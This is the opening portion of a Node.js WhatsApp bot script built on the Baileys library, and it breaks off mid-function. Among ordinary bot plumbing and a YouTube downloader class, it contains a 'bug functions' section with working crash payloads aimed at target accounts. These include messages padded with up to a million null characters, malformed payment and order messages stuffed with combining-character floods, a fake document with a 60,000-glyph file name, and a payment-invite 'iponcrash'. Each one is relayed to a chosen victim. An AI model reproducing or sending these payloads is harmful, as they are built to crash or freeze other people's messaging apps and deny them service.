//base by Toxxic

require('./lib/listmenu')
const samp = require("samp-query")
const {
	downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    useMultiFileAuthState, 
    makeWASocket, 
    InteractiveMessage,
    getContentType
} = require('@whiskeysockets/baileys')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,  Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api")
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const { sharerias, conns } = require('./sharerias')
const { color } = require('./lib/color')
const { cerpen } = require('./lib/cerpen')
const { Suntik } = require( './lib/Suntik_web.js')
const { follSun } = require('./lib/follSun.js')
const chalk = require('chalk')
const { youtubedl, youtubedlv2 } = require('@bochilteam/scraper-sosmed');
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const ytdl = require("@distube/ytdl-core")
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const { download } = require('aptoide-scraper');
const scp2 = require('./lib/scraper2') 
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js')
const pkg = require('imgur')
const darkphonk = fs.readFileSync('./rias/menu.mp3')
const alivem =fs.readFileSync('./rias/alive.mp3') 
const { ImgurClient } = pkg
const uploadImage = require('./lib/uploadImage')
const client = new ImgurClient({ clientId: "a0113354926015a" })
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase
} = require('./lib/myfunc')
const { Toxxic_antispam } = require('./lib/antispam')
//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
//store
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/list')

//cooldone
let lastUsed = 0;

//data
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
//media
const VoiceNoteLorenzo = JSON.parse(fs.readFileSync('./File/database/Lorenzovn.json'))
const StickerLorenzo = JSON.parse(fs.readFileSync('./File/database/Lorenzosticker.json'))
const ImageLorenzo = JSON.parse(fs.readFileSync('./File/database/Lorenzoimage.json'))
const VideoLorenzo = JSON.parse(fs.readFileSync('./File/database/Lorenzovideo.json'))
const DocLorenzo = JSON.parse(fs.readFileSync('./File/database/doc.json'))
const ZipLorenzo = JSON.parse(fs.readFileSync('./File/database/zip.json'))
const ApkLorenzo = JSON.parse(fs.readFileSync('./File/database/apk.json'))

//bug database
const { hakarin1 } = require('./src/data/function/XBug/hakarin1')
const { hakarin2 } = require('./src/data/function/XBug/hakarin2')
const { hakarin3 } = require('./src/data/function/XBug/hakarin3')
const { hakarin4 } = require('./src/data/function/XBug/hakarin4')
const { hakarin5 } = require('./src/data/function/XBug/hakarin5')
const { hakarin6 } = require('./src/data/function/XBug/hakarin6')
const wkwk = fs.readFileSync(`./src/data/function/XBug/x.mp3`)
const xsteek = fs.readFileSync(`./src/data/function/XBug/x.webp`)
const virgam = fs.readFileSync(`./lib/image/virgam.png`)
const latx = fs.readFileSync(`./image/latx.png`)
const qris = fs.readFileSync(`./image/qris.jpg`)
//store database
const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))

const Toxxicverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

const manyemojis = ["😄", "👍", "👏", "👌", "🥇", "🌟", "🎉", "🙌", "🤩", "💯", "🔥", "✨", "🚀", "💖", "🌈", "🌞", "🌠", "🌼", "💪", "😎", "💫", "💓", "🎈", "🎁", "🍾", "🎊", "🥳", "👑", "🌺", "🌻", "🌸","🌌", "🌠", "🚀", "🪐", "🌟"];
const randomEmoji = manyemojis[Math.floor(Math.random() * manyemojis.length)];
//time
const xtime = moment.tz('Africa/Lagos').format('HH:mm:ss')
const xdate = moment.tz('Africa/Lagos').format('DD/MM/YYYY')
const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var Riastimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var Riastimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var Riastimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var Riastimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var Riastimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var Riastimewisher = `Good Morning 🌄`
 } 
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = ToxxicTechInc = async (ToxxicTechInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
       var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix)
        //prefix2 and command2 particulary for auto download
        const prefix2 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
        const isCmd2 = body.startsWith(prefix2)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await ToxxicTechInc.decodeJid(ToxxicTechInc.user.id)
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const Lorenzoymisc = (m.quoted || m)
        const quoted = (Lorenzoymisc.mtype == 'buttonsMessage') ? Lorenzoymisc[Object.keys(Lorenzoymisc)[1]] : (Lorenzoymisc.mtype == 'templateMessage') ? Lorenzoymisc.hydratedTemplate[Object.keys(Lorenzoymisc.hydratedTemplate)[1]] : (Lorenzoymisc.mtype == 'product') ? Lorenzoymisc[Object.keys(Lorenzoymisc)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isLiveLocation = (type == 'liveLocationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const Lorenzoybody = body.startsWith(pric)
        const isCommand = Lorenzoybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await ToxxicTechInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isToxxicMedia = m.mtype
        //user status
        const isUser = Toxxicverifieduser.includes(sender)
        const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= isCreator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(ToxxicTechInc, m, premium)
        
        //theme sticker reply
        const hana = () => {
        let LorenzoStikRep = fs.readFileSync('./File/theme/sticker_reply/wait.webp')
        ToxxicTechInc.sendMessage(from, { sticker: LorenzoStikRep }, { quoted: m })
        }
        const LorenzoStickAdmin = () => {
        let LorenzoStikRep = fs.readFileSync('./File/theme/sticker_reply/admin.webp')
        ToxxicTechInc.sendMessage(from, { sticker: LorenzoStikRep }, { quoted: m })
        }
        const LorenzoStickBotAdmin = () => {
        let LorenzoStikRep = fs.readFileSync('./File/theme/sticker_reply/botadmin.webp')
        ToxxicTechInc.sendMessage(from, { sticker: LorenzoStikRep }, { quoted: m })
        }
        const ownernya = () => {
        let LorenzoStikRep = fs.readFileSync('./File/theme/sticker_reply/owner.webp')
        ToxxicTechInc.sendMessage(from, { sticker: LorenzoStikRep }, { quoted: m })
        }
        const LorenzoStickGroup = () => {
        let LorenzoStikRep = fs.readFileSync('./File/theme/sticker_reply/group.webp')
        ToxxicTechInc.sendMessage(from, { sticker: LorenzoStikRep }, { quoted: m })
        }
        const LorenzoStickPrivate = () => {
        let LorenzoStikRep = fs.readFileSync('./File/theme/sticker_reply/private.webp')
        ToxxicTechInc.sendMessage(from, { sticker: LorenzoStikRep }, { quoted: m })
        }

 //bug functions
 const fakejpg = fs.readFileSync(`./File/image/latx.png`)
const fakedoc = fs.readFileSync(`./File/image/latx.png`)
 
const zynbug = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `Q͒U͒E͒E͒N͒ R͒I͒A͒S͒ B͒U͒G͒S͒`
}
}
}

const zynxzobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/virgam.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Zʏɴxᴢᴏᴏ\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
}
]
}
}
}
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    qio.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "RIAS  CRASH"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'Toxxic', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await ToxxicTechInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": xsteek
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"Toxxic Crash",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const zpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `Msg ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",,\"name\":\"✳️᜴࿆͆᷍MODS CRASH╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`

}

]

}

}

}

}


async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `RIAS DOCUMENT`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await ToxxicTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await ToxxicTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function iponcrash(target) {
await ToxxicTechInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function ListMSGVIP3(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: '𝖅𝖞𝖓𝖝𝖟𝖔𝖔',
                        },
                        body: {
                            text: '𝖃',
                        },
                        footer: {
                            text: '𝕮𝖗𝖆𝖘𝖍',
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : '𝖅𝖞𝖓𝖝𝖟𝖔', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝖃', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝕮𝖗𝖆𝖘𝖍', url : , merchant_url :  }",
                                },
                            ],
                            messageParamsJson: ''.repeat(999999),
                        },
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await ToxxicTechInc.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}
class Ytdl {
    constructor() {
        this.baseUrl = 'https://id-y2mate.com';
    }

    async search(url) {
        const requestData = new URLSearchParams({
            k_query: url,
            k_page: 'home',
            hl: '',
            q_auto: '0'
        });

        const requestHeaders = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest'
        };

        try {
            const response = await axios.post(`${this.baseUrl}/mates/analyzeV2/ajax`, requestData, {
                headers: requestHeaders
            });

            const responseData = response.data;
            console.log(responseData);
            return responseData;
        } catch (error) {
            if (error.response) {
                console.error(`HTTP error! status: ${error.response.status}`);
            } else {
                console.error('Axios error: ', error.message);
            }
        }
    }

    async convert(videoId, key) {
        const requestData = new URLSearchParams({
            vid: videoId,
            k: key
        });

        const requestHeaders = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
            'Referer': `${this.baseUrl}/youtube/${videoId}`
        };

        try {
            const response = await axios.post(`${this.baseUrl}/mates/convertV2/index`, requestData, {
                headers: requestHeaders
            });

            const responseData = response.data;
            console.log(responseData);
            return responseData;
        } catch (error) {
            if (error.response) {
                console.error(`HTTP error! status: ${error.response.status}`);
            } else {
                console.error('Axios error: ', error.message);
            }
        }
    }

    async play(url) {
        let { links, vid, title } = await this.search(url);
        let video = {}, audio = {};

        for (let i in links.mp4) {
            let input = links.mp4[i];
            let { fquality, dlink } = await this.convert(vid, input.k);
            video[fquality] = {
                size: input.q,
                url: dlink
            };
        }

        for (let i in links.mp3) {
            let input = links.mp3[i];
            let { fquality, dlink } = await this.convert(vid, input.k);
            audio[fquality] = {
                size: input.q,
                url: dlink
            };
        }

        return { title, video, audio };
    }
}





async function downloadyt(urlnyu, mpbrp) {
  try {
    
